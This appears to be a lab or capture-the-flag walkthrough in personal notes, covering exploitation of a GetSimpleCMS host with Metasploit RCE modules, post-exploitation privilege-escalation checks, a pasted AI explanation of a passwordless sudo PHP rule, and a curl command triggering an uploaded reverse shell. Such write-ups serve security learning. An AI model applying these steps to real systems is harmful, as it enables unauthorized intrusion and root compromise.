

```
       =[ metasploit v6.4.18-dev                          ]
+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search getsimple

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/getsimplecms_unauth_code_exec                                                                                                            
```

![[../2. Recon/Images/Pasted image 20241007144838.png]]

This attack is successful and we are now username: www-data, Which allows us to grab the first capture flag
![[../2. Recon/Images/Pasted image 20241007145121.png]]

![[../2. Recon/Images/Pasted image 20241007145605.png]]

Following attack we execute the command below to identify any other potential paths for privilege escalation
```
run post/multi/recon/local_exploit_suggester
```

![[../2. Recon/Images/Pasted image 20241007170158.png]]

Check for sudo powers
```
run post/multi/recon/sudo_commands
```

![[Pasted image 20241007181120.png]]

From ChatGPT:
The sudo configuration you're looking at allows specific users to run certain commands with elevated privileges, typically as the root user or another user. Let's break it down:

| **Field**       | **Explanation**                                                                                                                                   |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Command**     | `/usr/bin/php` – This allows the execution of the PHP interpreter located at this path. Users can run any PHP script with elevated privileges.    |
| **RunAsUsers**  | `ALL` – The command can be run as any user, not just the root user. Users can impersonate any other user when running this command.               |
| **RunAsGroups** | `ALL` – The command can be run with the privileges of any group on the system.                                                                    |
| **Password?**   | `""` (empty) – No password is required when running the command with sudo. This bypasses the normal password prompt.                              |
| **Privesc?**    | `True` – Privilege escalation is allowed, meaning running this command can lead to higher permissions, such as root or another user's privileges. |
|                 |                                                                                                                                                   |

Upload reverseshell.php to data/uploads location

![[../2. Recon/Images/Pasted image 20241007214044.png]]



```
curl http://10.129.42.249/data/uploads/reverseshell.php
```

Validate Foothold, and proceed to next steps